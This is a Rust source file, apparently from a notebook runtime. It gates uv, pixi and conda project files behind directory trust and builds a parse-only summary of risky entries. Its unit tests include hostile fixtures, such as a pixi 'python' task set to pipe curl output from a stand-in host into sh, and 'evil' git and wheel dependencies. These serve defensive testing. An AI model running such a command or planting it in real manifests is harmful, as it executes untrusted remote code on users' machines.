//! Project-directory trust.
//!
//! A project file (`pyproject.toml`, `pixi.toml`, `environment.yml`) is a
//! program. uv runs the build backend and follows `[tool.uv.sources]` and
//! index settings; pixi runs `[activation] scripts`; conda installs `pip:`
//! entries. None of that is covered by the package-name allowlist, which only
//! reads notebook metadata.
//!
//! The unit of consent is a directory, like IDE workspace trust. An
//! attacker-supplied project arrives as a subtree. Trusting that subtree is
//! the decision being asked for, and editing files inside it later stays
//! inside the boundary the user accepted, so there is no content hash and no
//! re-prompt on manifest edits.
//!
//! [`TrustedProjectManifest`] is only constructed by [`evaluate`]. Every
//! function that hands a project file to uv, pixi, or conda takes it, so a
//! new launch path cannot reach those tools without passing the gate.
//!
//! Nothing in this module spawns a process. Detection and the summary are
//! parse-only.

use std::path::{Component, Path, PathBuf};

use runtime_doc::{ProjectTrustRuntimeState, ProjectTrustSummary};
use tracing::warn;

use crate::project_file::{DetectedProjectFile, ProjectFileKind};
use crate::trusted_packages::{DirectoryDecision, TrustedPackageStore};

pub(crate) const STATUS_NO_PROJECT: &str = "no_project";
pub(crate) const STATUS_TRUSTED: &str = "trusted";
pub(crate) const STATUS_UNTRUSTED: &str = "untrusted";
pub(crate) const STATUS_NOTEBOOK_ENV: &str = "notebook_env";

/// The resolved detection input of a manual launch waiting for folder consent.
/// It is valid only for the room identity captured before launch resolution.
#[derive(Debug, Clone)]
pub(crate) struct ProjectTrustLaunchContext {
    pub anchor: PathBuf,
    pub env_source: notebook_protocol::connection::EnvSource,
    pub identity_revision: u64,
}

/// Local provenance for the current project-trust projection. The revision
/// prevents an approval completing after an await from replacing a newer prompt.
/// Binding and working-directory setters hold this mutex while changing their
/// canonical value and incrementing identity_revision. Park and decision commits
/// check that revision under the same mutex, so a room move either invalidates
/// an already-published prompt or wins before a stale launch can publish one.
/// Never acquire an async lock while holding this synchronous mutex.
#[derive(Default)]
pub(crate) struct ProjectTrustPromptState {
    pub revision: u64,
    pub identity_revision: u64,
    pub launch_context: Option<ProjectTrustLaunchContext>,
}

impl ProjectTrustPromptState {
    pub(crate) fn identity_changed(&mut self) {
        self.identity_revision += 1;
        self.replace(None);
    }

    pub(crate) fn replace(&mut self, context: Option<ProjectTrustLaunchContext>) {
        self.revision += 1;
        self.launch_context = context;
    }
}

/// A project manifest whose directory is trusted on this machine.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct TrustedProjectManifest {
    path: PathBuf,
    kind: ProjectFileKind,
    trusted_dir: PathBuf,
}

impl TrustedProjectManifest {
    /// Canonical path of the manifest.
    pub(crate) fn path(&self) -> &Path {
        &self.path
    }

    pub(crate) fn kind(&self) -> &ProjectFileKind {
        &self.kind
    }

    /// Directory containing the manifest. uv and pixi run against this.
    pub(crate) fn project_dir(&self) -> &Path {
        self.path.parent().unwrap_or(&self.path)
    }

    /// The trusted directory that covers this manifest.
    #[cfg(test)]
    pub(crate) fn trusted_dir(&self) -> &Path {
        &self.trusted_dir
    }

    pub(crate) fn detected(&self) -> DetectedProjectFile {
        DetectedProjectFile {
            path: self.path.clone(),
            kind: self.kind.clone(),
        }
    }

    #[cfg(test)]
    pub(crate) fn for_test(path: PathBuf, kind: ProjectFileKind) -> Self {
        let trusted_dir = path.parent().map(Path::to_path_buf).unwrap_or_default();
        Self {
            path,
            kind,
            trusted_dir,
        }
    }
}

/// Outcome of the project trust gate for one detected manifest.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum ProjectTrustVerdict {
    /// The manifest may drive the environment.
    Trusted(TrustedProjectManifest),
    /// The user chose the notebook environment for this directory.
    UseNotebookEnv,
    /// No decision exists. Park the room and ask.
    NeedsApproval,
}

#[derive(Debug, Clone)]
pub(crate) struct ProjectTrustEvaluation {
    pub verdict: ProjectTrustVerdict,
    pub state: ProjectTrustRuntimeState,
}

/// Evaluate the gate for `detected`.
///
/// `session_notebook_env` is a room-scoped "use the notebook environment"
/// choice that was not persisted. Store errors fail closed to
/// [`ProjectTrustVerdict::NeedsApproval`].
pub(crate) fn evaluate(
    store: &TrustedPackageStore,
    detected: &DetectedProjectFile,
    session_notebook_env: Option<&Path>,
) -> ProjectTrustEvaluation {
    let manifest = std::fs::canonicalize(&detected.path).unwrap_or_else(|_| detected.path.clone());
    let project_dir = manifest
        .parent()
        .map(Path::to_path_buf)
        .unwrap_or_else(|| manifest.clone());

    let mut state = ProjectTrustRuntimeState {
        status: String::new(),
        needs_approval: false,
        manifest_path: manifest.to_string_lossy().into_owned(),
        kind: kind_str(&detected.kind).to_string(),
        project_dir: project_dir.to_string_lossy().into_owned(),
        repo_root: repo_root_for(&project_dir).map(|p| p.to_string_lossy().into_owned()),
        trusted_dir: None,
        summary: ProjectTrustSummary::default(),
    };

    if let Some(declined) = session_notebook_env {
        if project_dir.starts_with(declined) {
            state.status = STATUS_NOTEBOOK_ENV.to_string();
            state.trusted_dir = Some(declined.to_string_lossy().into_owned());
            return ProjectTrustEvaluation {
                verdict: ProjectTrustVerdict::UseNotebookEnv,
                state,
            };
        }
    }

    let found = match store.directory_decision_for(&project_dir) {
        Ok(found) => found,
        Err(error) => {
            warn!(
                "[project-trust] directory lookup failed for {}, asking the user: {}",
                project_dir.display(),
                error
            );
            None
        }
    };

    match found {
        Some(found) if found.decision == DirectoryDecision::Trusted => {
            state.status = STATUS_TRUSTED.to_string();
            state.trusted_dir = Some(found.directory.to_string_lossy().into_owned());
            ProjectTrustEvaluation {
                verdict: ProjectTrustVerdict::Trusted(TrustedProjectManifest {
                    path: manifest,
                    kind: detected.kind.clone(),
                    trusted_dir: found.directory,
                }),
                state,
            }
        }
        Some(found) => {
            state.status = STATUS_NOTEBOOK_ENV.to_string();
            state.trusted_dir = Some(found.directory.to_string_lossy().into_owned());
            ProjectTrustEvaluation {
                verdict: ProjectTrustVerdict::UseNotebookEnv,
                state,
            }
        }
        None => {
            state.status = STATUS_UNTRUSTED.to_string();
            state.needs_approval = true;
            state.summary = summarize(
                &DetectedProjectFile {
                    path: manifest.clone(),
                    kind: detected.kind.clone(),
                },
                &project_dir,
            );
            ProjectTrustEvaluation {
                verdict: ProjectTrustVerdict::NeedsApproval,
                state,
            }
        }
    }
}

/// The dependency slice a trusted project file vouches for in `trust`.
///
/// Returns `Some` only when all of these hold:
/// - the notebook is `Untrusted` and declares no PEP 723 cell dependencies
///   (those need their own notebook approval);
/// - the project file nearest `notebook_path` is `approved`, when given, so a
///   Save As into another folder cannot borrow an approval reviewed for the
///   original project;
/// - that project file's directory is trusted;
/// - the notebook's metadata for the manifest's ecosystem equals the manifest.
///
/// The returned `TrustInfo` contains only that slice.
pub(crate) fn reconcilable_trust_info(
    store: &TrustedPackageStore,
    notebook_path: &Path,
    approved: Option<&DetectedProjectFile>,
    trust: &crate::notebook_sync_server::TrustState,
) -> Option<runt_trust::TrustInfo> {
    if !matches!(trust.status, runt_trust::TrustStatus::Untrusted)
        || !trust.pep723_dependencies.is_empty()
    {
        return None;
    }
    let detected = notebook_path
        .parent()
        .and_then(crate::project_file::detect_project_file)?;
    if let Some(approved) = approved {
        let same_file = match (
            std::fs::canonicalize(&detected.path),
            std::fs::canonicalize(&approved.path),
        ) {
            (Ok(a), Ok(b)) => a == b,
            _ => detected.path == approved.path,
        };
        if !same_file || detected.kind != approved.kind {
            return None;
        }
    }
    if !matches!(
        evaluate(store, &detected, None).verdict,
        ProjectTrustVerdict::Trusted(_)
    ) {
        return None;
    }
    crate::notebook_sync_server::project_file_covered_trust_info(&detected, &trust.info)
}

/// Runtime state for a room whose environment does not come from a project.
pub(crate) fn no_project_state() -> ProjectTrustRuntimeState {
    ProjectTrustRuntimeState {
        status: STATUS_NO_PROJECT.to_string(),
        ..Default::default()
    }
}

/// Check that `directory` is a valid trust target for `manifest`: it must be
/// the manifest's directory or one of its ancestors.
pub(crate) fn validate_trust_target(directory: &Path, manifest: &Path) -> Result<PathBuf, String> {
    let target = std::fs::canonicalize(directory)
        .map_err(|e| format!("Cannot resolve {}: {e}", directory.display()))?;
    let manifest = std::fs::canonicalize(manifest)
        .map_err(|e| format!("Cannot resolve {}: {e}", manifest.display()))?;
    let project_dir = manifest.parent().unwrap_or(&manifest);
    if !project_dir.starts_with(&target) {
        return Err(format!(
            "{} does not contain the project file {}",
            target.display(),
            manifest.display()
        ));
    }
    if let Some(home) = dirs::home_dir().and_then(|h| std::fs::canonicalize(h).ok()) {
        if home.starts_with(&target) {
            return Err(format!(
                "Refusing to trust {}: it contains your home directory",
                target.display()
            ));
        }
    }
    Ok(target)
}

pub(crate) fn kind_str(kind: &ProjectFileKind) -> &'static str {
    match kind {
        ProjectFileKind::PyprojectToml => "pyproject_toml",
        ProjectFileKind::PixiToml => "pixi_toml",
        ProjectFileKind::EnvironmentYml => "environment_yml",
    }
}

/// Nearest ancestor-or-self of `project_dir` holding `.git`, when it differs
/// from `project_dir`. Stops below the home directory.
fn repo_root_for(project_dir: &Path) -> Option<PathBuf> {
    let home = dirs::home_dir().and_then(|h| std::fs::canonicalize(h).ok());
    for ancestor in project_dir.ancestors() {
        if home.as_deref() == Some(ancestor) {
            return None;
        }
        if ancestor.join(".git").exists() {
            return (ancestor != project_dir).then(|| ancestor.to_path_buf());
        }
    }
    None
}

// ── Room integration ────────────────────────────────────────────────

/// Result of the gate at the point a launch has chosen its env source.
#[derive(Debug)]
pub(crate) enum RoomProjectGate {
    /// The env source is not project-backed.
    NotProject,
    /// The project may drive the environment.
    Trusted(TrustedProjectManifest),
    /// The room is parked in `AwaitingProjectTrust`. The launch must stop.
    Parked,
    /// The room moved while a manual launch path was being resolved.
    ContextChanged,
}

/// Whether `env_source` hands a project file to uv, pixi, or conda.
pub(crate) fn is_project_env_source(env_source: &notebook_protocol::connection::EnvSource) -> bool {
    use notebook_protocol::connection::EnvSource;
    matches!(
        env_source,
        EnvSource::Pyproject | EnvSource::PixiToml | EnvSource::EnvYml
    )
}

/// The project file a launch with `env_source` would hand to uv, pixi, or
/// conda. `detected` is the auto-detected project, preferred when its kind
/// matches; `anchor` is the notebook path or working directory.
pub(crate) fn manifest_for_env_source(
    env_source: &notebook_protocol::connection::EnvSource,
    detected: Option<&DetectedProjectFile>,
    anchor: Option<&Path>,
) -> Option<DetectedProjectFile> {
    use notebook_protocol::connection::EnvSource;
    let kind = match env_source {
        EnvSource::Pyproject => ProjectFileKind::PyprojectToml,
        EnvSource::PixiToml => ProjectFileKind::PixiToml,
        EnvSource::EnvYml => ProjectFileKind::EnvironmentYml,
        _ => return None,
    };
    if let Some(detected) = detected.filter(|d| d.kind == kind) {
        return Some(detected.clone());
    }
    let anchor = anchor?;
    match kind {
        ProjectFileKind::PixiToml => crate::pixi_project::locate_pixi_manifest(Some(anchor))
            .map(|path| DetectedProjectFile { path, kind }),
        _ => crate::project_file::find_nearest_project_file(anchor, std::slice::from_ref(&kind)),
    }
}

/// Evaluate the gate for `detected` using the room's store and any
/// room-scoped notebook-environment choice.
pub(crate) fn evaluate_for_room(
    room: &crate::notebook_sync_server::NotebookRoom,
    detected: &DetectedProjectFile,
) -> ProjectTrustEvaluation {
    let declined = room
        .project_trust_session_decline
        .lock()
        .ok()
        .and_then(|guard| guard.clone());
    evaluate(&room.trusted_packages, detected, declined.as_deref())
}

/// Apply the gate for a launch whose env source is project-backed.
///
/// `manifest` is the project file the launch would use. `None` means the
/// env source is not project-backed. A remembered "use the notebook
/// environment" choice cannot satisfy a launch that explicitly asks for the
/// project, so it parks and asks again.
pub(crate) fn require_for_launch(
    room: &crate::notebook_sync_server::NotebookRoom,
    manifest: Option<&DetectedProjectFile>,
) -> RoomProjectGate {
    require_for_launch_in_context(room, manifest, None)
}

pub(crate) fn require_for_launch_in_context(
    room: &crate::notebook_sync_server::NotebookRoom,
    manifest: Option<&DetectedProjectFile>,
    context: Option<ProjectTrustLaunchContext>,
) -> RoomProjectGate {
    let Some(manifest) = manifest else {
        room.project_trust_prompt
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .replace(None);
        return RoomProjectGate::NotProject;
    };
    let mut eval = evaluate_for_room(room, manifest);
    match eval.verdict {
        ProjectTrustVerdict::Trusted(trusted) => {
            publish_state(room, &eval.state);
            RoomProjectGate::Trusted(trusted)
        }
        ProjectTrustVerdict::UseNotebookEnv | ProjectTrustVerdict::NeedsApproval => {
            if eval.state.status != STATUS_UNTRUSTED {
                eval.state.status = STATUS_UNTRUSTED.to_string();
                eval.state.needs_approval = true;
                eval.state.trusted_dir = None;
                let project_dir = PathBuf::from(&eval.state.project_dir);
                let detected = DetectedProjectFile {
                    path: PathBuf::from(&eval.state.manifest_path),
                    kind: manifest.kind.clone(),
                };
                eval.state.summary = summarize(&detected, &project_dir);
            }
            if park(room, &eval.state, context) {
                RoomProjectGate::Parked
            } else {
                RoomProjectGate::ContextChanged
            }
        }
    }
}

/// Write project trust state without touching the lifecycle.
pub(crate) fn publish_state(
    room: &crate::notebook_sync_server::NotebookRoom,
    state: &ProjectTrustRuntimeState,
) {
    let mut prompt = room
        .project_trust_prompt
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    if let Err(error) = room.state.with_doc(|sd| sd.set_project_trust(state)) {
        warn!("[runtime-state] {}", error);
    } else {
        prompt.replace(None);
    }
}

/// Write project trust state and park the room in `AwaitingProjectTrust`.
fn park(
    room: &crate::notebook_sync_server::NotebookRoom,
    state: &ProjectTrustRuntimeState,
    context: Option<ProjectTrustLaunchContext>,
) -> bool {
    tracing::info!(
        "[project-trust] {} is not trusted; waiting for approval",
        state.project_dir
    );
    let mut context_current = true;
    if let Some(Err(error)) = room.commit_unless_launch_cancelled(|| {
        let mut prompt = room
            .project_trust_prompt
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        if context
            .as_ref()
            .is_some_and(|context| context.identity_revision != prompt.identity_revision)
        {
            context_current = false;
            return Ok(());
        }
        let result = room.state.with_doc(|sd| {
            sd.set_project_trust(state)?;
            sd.set_lifecycle(&runtime_doc::RuntimeLifecycle::AwaitingProjectTrust)
        });
        if result.is_ok() {
            prompt.replace(context);
        }
        result
    }) {
        warn!("[runtime-state] {}", error);
    }
    context_current
}

// ── Parse-only summary ──────────────────────────────────────────────

const DEFAULT_CHANNELS: &[&str] = &["conda-forge", "defaults"];

/// Describe what trusting the project lets uv, pixi, or conda do. Missing or
/// malformed files produce an empty summary; the dialog still shows the path.
pub(crate) fn summarize(detected: &DetectedProjectFile, project_dir: &Path) -> ProjectTrustSummary {
    let mut summary = ProjectTrustSummary::default();
    match detected.kind {
        ProjectFileKind::PyprojectToml => {
            if let Some(doc) = read_toml(&detected.path) {
                summarize_pyproject(&doc, project_dir, &mut summary);
            }
            if let Some(uv_toml) = read_toml(&project_dir.join("uv.toml")) {
                summarize_uv_settings(&uv_toml, project_dir, &mut summary);
            }
        }
        ProjectFileKind::PixiToml => {
            if let Some(doc) = read_toml(&detected.path) {
                let is_pyproject = detected
                    .path
                    .file_name()
                    .is_some_and(|name| name == "pyproject.toml");
                let root = if is_pyproject {
                    if let Some(build_backend) = doc
                        .get("build-system")
                        .and_then(|b| b.get("build-backend"))
                        .and_then(toml::Value::as_str)
                    {
                        summary.build_backend = Some(build_backend.to_string());
                    }
                    doc.get("tool").and_then(|t| t.get("pixi")).cloned()
                } else {
                    Some(doc)
                };
                if let Some(root) = root {
                    summarize_pixi(&root, project_dir, &mut summary);
                }
            }
        }
        ProjectFileKind::EnvironmentYml => {
            summarize_environment_yml(detected, project_dir, &mut summary);
        }
    }
    summary
}

fn read_toml(path: &Path) -> Option<toml::Value> {
    let content = std::fs::read_to_string(path).ok()?;
    toml::from_str(&content).ok()
}

fn summarize_pyproject(doc: &toml::Value, project_dir: &Path, summary: &mut ProjectTrustSummary) {
    if let Some(deps) = doc
        .get("project")
        .and_then(|p| p.get("dependencies"))
        .and_then(toml::Value::as_array)
    {
        for dep in deps.iter().filter_map(toml::Value::as_str) {
            push_pep508(dep, summary);
        }
    }
    if let Some(build_backend) = doc
        .get("build-system")
        .and_then(|b| b.get("build-backend"))
        .and_then(toml::Value::as_str)
    {
        summary.build_backend = Some(build_backend.to_string());
    }
    if let Some(uv) = doc.get("tool").and_then(|t| t.get("uv")) {
        summarize_uv_settings(uv, project_dir, summary);
        if let Some(sources) = uv.get("sources").and_then(toml::Value::as_table) {
            for (name, source) in sources {
                describe_source_table(name, source, project_dir, summary);
            }
        }
        if let Some(members) = uv
            .get("workspace")
            .and_then(|w| w.get("members"))
            .and_then(toml::Value::as_array)
        {
            for member in members.iter().filter_map(toml::Value::as_str) {
                if escapes(project_dir, member) {
                    summary
                        .outside_directory
                        .push(format!("workspace member {member}"));
                }
            }
        }
    }
}

/// Index settings shared by `[tool.uv]` and a sibling `uv.toml`.
fn summarize_uv_settings(uv: &toml::Value, project_dir: &Path, summary: &mut ProjectTrustSummary) {
    for key in ["index-url", "extra-index-url", "find-links"] {
        for url in string_or_array(uv.get(key)) {
            push_unique(&mut summary.indexes_and_channels, format!("{key}: {url}"));
            if is_local_path(&url) && escapes(project_dir, &url) {
                summary.outside_directory.push(format!("{key}: {url}"));
            }
        }
    }
    if let Some(indexes) = uv.get("index").and_then(toml::Value::as_array) {
        for index in indexes {
            if let Some(url) = index.get("url").and_then(toml::Value::as_str) {
                let name = index
                    .get("name")
                    .and_then(toml::Value::as_str)
                    .unwrap_or("index");
                push_unique(&mut summary.indexes_and_channels, format!("{name}: {url}"));
            }
        }
    }
}

fn summarize_pixi(root: &toml::Value, project_dir: &Path, summary: &mut ProjectTrustSummary) {
    for header in ["workspace", "project"] {
        for channel in string_or_array(root.get(header).and_then(|p| p.get("channels"))) {
            if !DEFAULT_CHANNELS.contains(&channel.as_str()) {
                push_unique(&mut summary.indexes_and_channels, channel);
            }
        }
    }
    if let Some(options) = root.get("pypi-options") {
        for key in ["index-url", "extra-index-urls", "find-links"] {
            for url in string_or_array(options.get(key)) {
                push_unique(&mut summary.indexes_and_channels, format!("{key}: {url}"));
            }
        }
    }

    let mut scopes = vec![root.clone()];
    for group in ["feature", "target"] {
        if let Some(table) = root.get(group).and_then(toml::Value::as_table) {
            scopes.extend(table.values().cloned());
        }
    }
    for scope in &scopes {
        for section in ["dependencies", "pypi-dependencies"] {
            if let Some(deps) = scope.get(section).and_then(toml::Value::as_table) {
                for (name, spec) in deps {
                    if spec.is_str() {
                        push_unique(&mut summary.dependencies, name.clone());
                    } else {
                        describe_source_table(name, spec, project_dir, summary);
                    }
                }
            }
        }
        for script in string_or_array(scope.get("activation").and_then(|a| a.get("scripts"))) {
            if escapes(project_dir, &script) {
                summary
                    .outside_directory
                    .push(format!("activation script {script}"));
            }
            push_unique(&mut summary.activation_scripts, script);
        }
        // The kernel fallback runs `pixi run python`. A task named `python`
        // replaces the interpreter with arbitrary commands.
        if scope.get("tasks").and_then(|t| t.get("python")).is_some() {
            push_unique(
                &mut summary.activation_scripts,
                "task `python` (runs instead of the interpreter)".to_string(),
            );
        }
    }
}

fn summarize_environment_yml(
    detected: &DetectedProjectFile,
    project_dir: &Path,
    summary: &mut ProjectTrustSummary,
) {
    use rattler_conda_types::EnvironmentYaml;

    let Ok(content) = std::fs::read_to_string(&detected.path) else {
        return;
    };
    let Ok(env) = EnvironmentYaml::from_yaml_str(&content) else {
        return;
    };
    for spec in env.match_specs() {
        let text = spec.to_string();
        if spec.url.is_some() {
            summary.non_registry_sources.push(text);
        } else {
            push_unique(&mut summary.dependencies, text);
        }
    }
    for channel in &env.channels {
        let channel = channel.to_string();
        if !DEFAULT_CHANNELS.contains(&channel.as_str()) {
            push_unique(&mut summary.indexes_and_channels, channel);
        }
    }
    for pip in env.pip_specs().unwrap_or_default() {
        let pip = pip.trim();
        if pip.starts_with("--") {
            push_unique(&mut summary.indexes_and_channels, format!("pip {pip}"));
        } else if pip.starts_with("-e") || pip.starts_with("-r") || looks_like_direct_ref(pip) {
            summary.non_registry_sources.push(format!("pip: {pip}"));
            let target = pip.trim_start_matches("-e").trim_start_matches("-r").trim();
            if is_local_path(target) && escapes(project_dir, target) {
                summary.outside_directory.push(format!("pip: {pip}"));
            }
        } else {
            push_unique(&mut summary.dependencies, format!("pip: {pip}"));
        }
    }

    if let Some(decision) = crate::notebook_sync_server::missing_conda_env_yml_decision(detected) {
        summary.environment_to_build =
            Some(format!("{}: {}", decision.label, decision.create_command));
    } else if let Some(prefix) = crate::project_file::resolve_conda_env_prefix(&detected.path) {
        // A shipped prefix runs its activation hooks on every launch.
        let activate_d = prefix.join("etc").join("conda").join("activate.d");
        if let Ok(entries) = std::fs::read_dir(&activate_d) {
            for entry in entries.flatten() {
                push_unique(
                    &mut summary.activation_scripts,
                    entry.path().to_string_lossy().into_owned(),
                );
            }
        }
    }
}

/// Describe a dependency given as a table: `{ git = ... }`, `{ path = ... }`,
/// `{ url = ... }`, `{ index = ... }`, `{ workspace = true }`, or a version.
fn describe_source_table(
    name: &str,
    source: &toml::Value,
    project_dir: &Path,
    summary: &mut ProjectTrustSummary,
) {
    // uv allows a list of sources keyed by marker.
    if let Some(list) = source.as_array() {
        for entry in list {
            describe_source_table(name, entry, project_dir, summary);
        }
        return;
    }
    let Some(table) = source.as_table() else {
        return;
    };
    if let Some(git) = table.get("git").and_then(toml::Value::as_str) {
        summary
            .non_registry_sources
            .push(format!("{name}: git {git}"));
    } else if let Some(url) = table.get("url").and_then(toml::Value::as_str) {
        summary.non_registry_sources.push(format!("{name}: {url}"));
    } else if let Some(path) = table.get("path").and_then(toml::Value::as_str) {
        summary
            .non_registry_sources
            .push(format!("{name}: path {path}"));
        if escapes(project_dir, path) {
            summary
                .outside_directory
                .push(format!("{name}: path {path}"));
        }
    } else if let Some(index) = table.get("index").and_then(toml::Value::as_str) {
        summary
            .non_registry_sources
            .push(format!("{name}: index {index}"));
    } else if let Some(channel) = table.get("channel").and_then(toml::Value::as_str) {
        if !DEFAULT_CHANNELS.contains(&channel) {
            summary
                .non_registry_sources
                .push(format!("{name}: channel {channel}"));
        } else {
            push_unique(&mut summary.dependencies, name.to_string());
        }
    } else {
        push_unique(&mut summary.dependencies, name.to_string());
    }
}

fn push_pep508(dep: &str, summary: &mut ProjectTrustSummary) {
    if looks_like_direct_ref(dep) {
        summary.non_registry_sources.push(dep.to_string());
    } else {
        push_unique(&mut summary.dependencies, dep.to_string());
    }
}

fn looks_like_direct_ref(spec: &str) -> bool {
    spec.contains(" @ ")
        || spec.contains("://")
        || spec.starts_with("git+")
        || spec.starts_with("file:")
        || is_local_path(spec)
}

fn is_local_path(value: &str) -> bool {
    value.starts_with('.') || value.starts_with('/') || value.starts_with('~')
}

/// Whether a path written in a manifest resolves outside `project_dir`.
/// Resolution is lexical so it works for paths that do not exist yet.
fn escapes(project_dir: &Path, written: &str) -> bool {
    let written = written.trim_start_matches("file://");
    if written.contains("://") {
        return false;
    }
    let candidate = if let Some(rest) = written.strip_prefix("~/") {
        match dirs::home_dir() {
            Some(home) => home.join(rest),
            None => return true,
        }
    } else {
        project_dir.join(written)
    };
    let mut resolved = PathBuf::new();
    for component in candidate.components() {
        match component {
            Component::ParentDir => {
                resolved.pop();
            }
            Component::CurDir => {}
            other => resolved.push(other),
        }
    }
    let resolved = std::fs::canonicalize(&resolved).unwrap_or(resolved);
    !resolved.starts_with(project_dir)
}

fn string_or_array(value: Option<&toml::Value>) -> Vec<String> {
    match value {
        Some(toml::Value::String(s)) => vec![s.clone()],
        Some(toml::Value::Array(items)) => items
            .iter()
            .filter_map(|item| match item {
                toml::Value::String(s) => Some(s.clone()),
                // pixi channels may be `{ channel = "...", priority = N }`.
                toml::Value::Table(t) => t
                    .get("channel")
                    .and_then(toml::Value::as_str)
                    .map(str::to_string),
                _ => None,
            })
            .collect(),
        _ => vec![],
    }
}

fn push_unique(list: &mut Vec<String>, value: String) {
    if !list.contains(&value) {
        list.push(value);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn store(temp: &Path) -> TrustedPackageStore {
        TrustedPackageStore::open(temp.join("trust.sqlite")).unwrap()
    }

    fn write(dir: &Path, name: &str, content: &str) -> PathBuf {
        std::fs::create_dir_all(dir).unwrap();
        let path = dir.join(name);
        std::fs::write(&path, content).unwrap();
        path
    }

    fn pyproject(dir: &Path, content: &str) -> DetectedProjectFile {
        DetectedProjectFile {
            path: write(dir, "pyproject.toml", content),
            kind: ProjectFileKind::PyprojectToml,
        }
    }

    #[test]
    fn untrusted_directory_needs_approval_with_summary() {
        let temp = tempfile::tempdir().unwrap();
        let store = store(temp.path());
        let detected = pyproject(
            &temp.path().join("proj"),
            r#"
[project]
dependencies = ["pandas>=2", "evil @ https://example.com/evil.whl"]
[build-system]
build-backend = "hatchling.build"
[tool.uv]
extra-index-url = ["https://pypi.example.com/simple"]
[tool.uv.sources]
local = { path = "../outside" }
fork = { git = "https://github.com/example/fork" }
"#,
        );

        let eval = evaluate(&store, &detected, None);
        assert_eq!(eval.verdict, ProjectTrustVerdict::NeedsApproval);
        assert_eq!(eval.state.status, STATUS_UNTRUSTED);
        assert!(eval.state.needs_approval);
        assert_eq!(eval.state.kind, "pyproject_toml");
        let summary = &eval.state.summary;
        assert_eq!(summary.dependencies, vec!["pandas>=2".to_string()]);
        assert_eq!(summary.build_backend.as_deref(), Some("hatchling.build"));
        assert!(summary
            .non_registry_sources
            .iter()
            .any(|s| s.contains("evil.whl")));
        assert!(summary
            .non_registry_sources
            .iter()
            .any(|s| s.starts_with("fork: git")));
        assert!(summary
            .indexes_and_channels
            .iter()
            .any(|s| s.contains("pypi.example.com")));
        assert_eq!(
            summary.outside_directory,
            vec!["local: path ../outside".to_string()]
        );
    }

    #[test]
    fn trusted_ancestor_allows_manifest_without_rehashing() {
        let temp = tempfile::tempdir().unwrap();
        let store = store(temp.path());
        let repo = temp.path().join("repo");
        let detected = pyproject(&repo.join("pkg"), "[project]\ndependencies = []\n");
        store
            .set_directory_decision(&repo, DirectoryDecision::Trusted, "test")
            .unwrap();

        let eval = evaluate(&store, &detected, None);
        let ProjectTrustVerdict::Trusted(manifest) = eval.verdict else {
            panic!("expected trusted, got {:?}", eval.verdict);
        };
        assert_eq!(
            manifest.trusted_dir(),
            std::fs::canonicalize(&repo).unwrap()
        );
        assert_eq!(eval.state.status, STATUS_TRUSTED);
        assert!(!eval.state.needs_approval);

        // Editing the manifest stays inside the trusted boundary.
        std::fs::write(&detected.path, "[project]\ndependencies = [\"requests\"]\n").unwrap();
        assert!(matches!(
            evaluate(&store, &detected, None).verdict,
            ProjectTrustVerdict::Trusted(_)
        ));
    }

    #[test]
    fn remembered_and_session_declines_use_notebook_env() {
        let temp = tempfile::tempdir().unwrap();
        let store = store(temp.path());
        let dir = temp.path().join("proj");
        let detected = pyproject(&dir, "[project]\n");
        let canonical = std::fs::canonicalize(&dir).unwrap();

        let eval = evaluate(&store, &detected, Some(&canonical));
        assert_eq!(eval.verdict, ProjectTrustVerdict::UseNotebookEnv);
        assert_eq!(eval.state.status, STATUS_NOTEBOOK_ENV);

        store
            .set_directory_decision(&dir, DirectoryDecision::NotebookEnv, "test")
            .unwrap();
        let eval = evaluate(&store, &detected, None);
        assert_eq!(eval.verdict, ProjectTrustVerdict::UseNotebookEnv);
    }

    #[test]
    fn unavailable_store_fails_closed() {
        let temp = tempfile::tempdir().unwrap();
        let store = TrustedPackageStore::unavailable("test");
        let detected = pyproject(&temp.path().join("proj"), "[project]\n");
        assert_eq!(
            evaluate(&store, &detected, None).verdict,
            ProjectTrustVerdict::NeedsApproval
        );
    }

    #[test]
    fn trust_target_must_contain_the_manifest() {
        let temp = tempfile::tempdir().unwrap();
        let proj = temp.path().join("proj");
        let detected = pyproject(&proj, "[project]\n");
        let other = temp.path().join("other");
        std::fs::create_dir_all(&other).unwrap();

        assert!(validate_trust_target(&proj, &detected.path).is_ok());
        assert!(validate_trust_target(temp.path(), &detected.path).is_ok());
        assert!(validate_trust_target(&other, &detected.path).is_err());
    }

    #[test]
    fn pixi_summary_flags_activation_scripts_and_python_task() {
        let temp = tempfile::tempdir().unwrap();
        let dir = temp.path().join("proj");
        let path = write(
            &dir,
            "pixi.toml",
            r#"
[workspace]
channels = ["conda-forge", "https://repo.example.com/channel"]
[dependencies]
python = "3.12.*"
[pypi-dependencies]
tool = { git = "https://github.com/example/tool" }
[activation]
scripts = ["setup.sh"]
[tasks]
python = "curl https://example.com | sh"
"#,
        );
        let summary = summarize(
            &DetectedProjectFile {
                path,
                kind: ProjectFileKind::PixiToml,
            },
            &dir,
        );
        assert_eq!(summary.dependencies, vec!["python".to_string()]);
        assert_eq!(
            summary.indexes_and_channels,
            vec!["https://repo.example.com/channel".to_string()]
        );
        assert!(summary
            .non_registry_sources
            .iter()
            .any(|s| s.starts_with("tool: git")));
        assert!(summary.activation_scripts.contains(&"setup.sh".to_string()));
        assert!(summary
            .activation_scripts
            .iter()
            .any(|s| s.contains("task `python`")));
    }

    #[test]
    fn environment_yml_summary_flags_pip_sources() {
        let temp = tempfile::tempdir().unwrap();
        let dir = temp.path().join("proj");
        let path = write(
            &dir,
            "environment.yml",
            r#"
name: nteract-project-trust-test-env-that-does-not-exist
channels:
  - conda-forge
  - https://repo.example.com/channel
dependencies:
  - numpy
  - pip
  - pip:
      - requests
      - git+https://github.com/example/evil
      - --extra-index-url https://pypi.example.com/simple
"#,
        );
        let summary = summarize(
            &DetectedProjectFile {
                path,
                kind: ProjectFileKind::EnvironmentYml,
            },
            &dir,
        );
        assert!(summary.dependencies.iter().any(|d| d.starts_with("numpy")));
        assert!(summary.dependencies.contains(&"pip: requests".to_string()));
        assert!(summary
            .non_registry_sources
            .iter()
            .any(|s| s.contains("git+https://github.com/example/evil")));
        assert!(summary
            .indexes_and_channels
            .iter()
            .any(|s| s.contains("repo.example.com")));
        assert!(summary
            .indexes_and_channels
            .iter()
